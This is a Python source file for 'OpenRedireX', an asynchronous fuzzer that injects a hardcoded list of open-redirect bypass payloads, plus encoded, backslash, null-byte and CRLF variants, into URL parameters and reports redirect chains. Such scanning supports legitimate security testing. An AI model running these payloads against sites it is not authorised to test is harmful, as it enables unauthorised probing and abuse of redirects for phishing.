#!/usr/bin/env python3

import asyncio
import aiohttp
import argparse
import sys
import socket
from aiohttp import ClientError
from tqdm import tqdm
from urllib.parse import urlparse, parse_qsl, urlencode, urlunparse, quote
from typing import List


# Color constants
LIGHT_GREEN = '\033[92m'  # Light Green
DARK_GREEN = '\033[32m'   # Dark Green
ENDC = '\033[0m'          # Reset to default color

redirect_payloads = [
"//example.com@google.com/%2f..",
"///google.com/%2f..",
"///example.com@google.com/%2f..",
"////google.com/%2f..",
"https://google.com/%2f..",
"https://example.com@google.com/%2f..",
"/https://google.com/%2f..",
"/https://example.com@google.com/%2f..",
"//google.com/%2f%2e%2e",
"//example.com@google.com/%2f%2e%2e",
"///google.com/%2f%2e%2e",
"///example.com@google.com/%2f%2e%2e",
"////google.com/%2f%2e%2e",
"/http://example.com",
"/http:/example.com",
"/https:/%5cexample.com/",
"/https://%09/example.com",
"/https://%5cexample.com",
"/https:///example.com/%2e%2e",
"/https:///example.com/%2f%2e%2e",
"/https://example.com",
"/https://example.com/",
"/https://example.com/%2e%2e",
"/https://example.com/%2e%2e%2f",
"/https://example.com/%2f%2e%2e",
"/https://example.com/%2f..",
"/https://example.com//",
"/https:example.com",
"/%09/example.com",
"/%2f%2fexample.com",
"/%2f%5c%2f%67%6f%6f%67%6c%65%2e%63%6f%6d/",
"/%5cexample.com",
"/%68%74%74%70%3a%2f%2f%67%6f%6f%67%6c%65%2e%63%6f%6d",
"/.example.com",
"//%09/example.com",
"//%5cexample.com",
"///%09/example.com",
"///%5cexample.com",
"////%09/example.com",
"////%5cexample.com",
"/////example.com",
"/////example.com/",
r"////\;@example.com",
"////example.com/"
]

def generate_payload_variants(payloads):
    variants = []
    seen = set()

    def add_payload(payload):
        if payload and payload not in seen:
            seen.add(payload)
            variants.append(payload)

    for payload in payloads:
        add_payload(payload)
        add_payload(payload.replace("https://", "http://"))
        add_payload(payload.replace("://", "//"))
        add_payload(payload.replace("://", ":/"))
        add_payload("//" + payload.lstrip("/"))
        add_payload("///" + payload.lstrip("/"))
        add_payload("////" + payload.lstrip("/"))
        add_payload(payload.replace("/", "\\"))
        add_payload(payload.replace("//", "\\\\"))
        add_payload(quote(payload, safe=""))
        add_payload(quote(payload, safe="/%"))
        add_payload(quote(payload, safe="/:@%?=&"))
        add_payload(payload.replace("?", "%3F").replace("#", "%23"))
        add_payload(f"{payload}%00")
        add_payload(f"{payload}%0d%0a")
        add_payload(f"{payload}?")
        add_payload(f"{payload}#")
        add_payload(f"{payload}/")

    return variants


def load_payloads(payloads_file, generate_variants=False):
    if payloads_file:
        with open(payloads_file) as f:
            payloads = [line.strip() for line in f if line.strip()]
    else:
        payloads = redirect_payloads  # Return hardcoded list if no file specified

    if generate_variants:
        return generate_payload_variants(payloads)

    return payloads


def fuzzify_url(url: str, keyword: str = "FUZZ") -> str:
    # If the keyword is already in the url, return the url as is.
    if keyword in url:
        return url

    # Otherwise, replace all parameter values with the keyword.
    parsed_url = urlparse(url)
    params = parse_qsl(parsed_url.query)
    fuzzed_params = [(k, keyword) for k, _ in params]
    fuzzed_query = urlencode(fuzzed_params)

    # Construct the fuzzified url.
    fuzzed_url = urlunparse(
        [parsed_url.scheme, parsed_url.netloc, parsed_url.path, parsed_url.params, fuzzed_query, parsed_url.fragment])

    return fuzzed_url


def load_urls(keyword: str = "FUZZ") -> List[str]:
    urls = []
    for line in sys.stdin:
        url = line.strip()
        if not url:
            continue
        fuzzed_url = fuzzify_url(url, keyword)
        urls.append(fuzzed_url)
    return urls



async def fetch_url(session, url):
    try:
        async with session.head(url, allow_redirects=True, timeout=10) as response:
            return response
    except (ClientError, asyncio.exceptions.TimeoutError, socket.gaierror, UnicodeError, OSError):
        tqdm.write(f'[ERROR] Error fetching: {url}', file=sys.stderr)
        return None

async def process_request(session, filled_url, pbar):
    try:
        response = await fetch_url(session, filled_url)
        if response and response.history:
            locations = " --> ".join(
                [str(redirect.url) for redirect in response.history] + [str(response.url)]
            )
            # If the string contains "-->", print in green
            if "-->" in locations:
                tqdm.write(f'{DARK_GREEN}[FOUND]{ENDC} {LIGHT_GREEN}{filled_url} redirects to {locations}{ENDC}')
            else:
                tqdm.write(f'[INFO] {filled_url} redirects to {locations}')
    finally:
        pbar.update()


async def process_urls(concurrency, session, urls, payloads, keyword):
    total_requests = len(urls) * len(payloads)
    if total_requests == 0:
        return

    worker_count = min(concurrency, total_requests)
    queue = asyncio.Queue(maxsize=worker_count * 2)

    async def producer():
        for url in urls:
            for payload in payloads:
                filled_url = url.replace(keyword, payload)
                await queue.put(filled_url)

    async def worker():
        while True:
            filled_url = await queue.get()
            try:
                await process_request(session, filled_url, pbar)
            finally:
                queue.task_done()

    with tqdm(total=total_requests, ncols=70, desc='Processing', unit='url', position=0) as pbar:
        producer_task = asyncio.create_task(producer())
        workers = [asyncio.create_task(worker()) for _ in range(worker_count)]
        await producer_task
        await queue.join()
        for worker_task in workers:
            worker_task.cancel()
        await asyncio.gather(*workers, return_exceptions=True)

async def main(args):
    payloads = load_payloads(args.payloads, args.variants)
    if not payloads:
        raise SystemExit('[ERROR] No payloads to process.')
    urls = load_urls(args.keyword)
    if not urls:
        return
    tqdm.write(f'[INFO] Processing {len(urls)} URLs with {len(payloads)} payloads.')
    async with aiohttp.ClientSession() as session:
        await process_urls(args.concurrency, session, urls, payloads, args.keyword)

if __name__ == "__main__":
    banner = r"""
   ____                   ____           ___               
  / __ \____  ___  ____  / __ \___  ____/ (_)_______  _  __
 / / / / __ \/ _ \/ __ \/ /_/ / _ \/ __  / / ___/ _ \| |/_/
/ /_/ / /_/ /  __/ / / / _, _/  __/ /_/ / / /  /  __/>  <  
\____/ .___/\___/_/ /_/_/ |_|\___/\__,_/_/_/   \___/_/|_|  
    /_/                                                    

    """
    print(banner)
    parser = argparse.ArgumentParser(description="OpenRedireX : A fuzzer for detecting open redirect vulnerabilities")
    parser.add_argument('-p', '--payloads', help='file of payloads', required=False)
    parser.add_argument('-k', '--keyword', help='keyword in urls to replace with payload (default is FUZZ)', default="FUZZ")
    parser.add_argument('-c', '--concurrency', help='number of concurrent tasks (default is 100)', type=int, default=100)
    parser.add_argument('-V', '--variants', help='generate encoded and bypass variants for each payload', action='store_true')
    args = parser.parse_args()
    if args.concurrency < 1:
        parser.error('--concurrency must be greater than 0')
    try:
        asyncio.run(main(args))
    except KeyboardInterrupt:
        print("\nInterrupted by user. Exiting...")
        sys.exit(0)
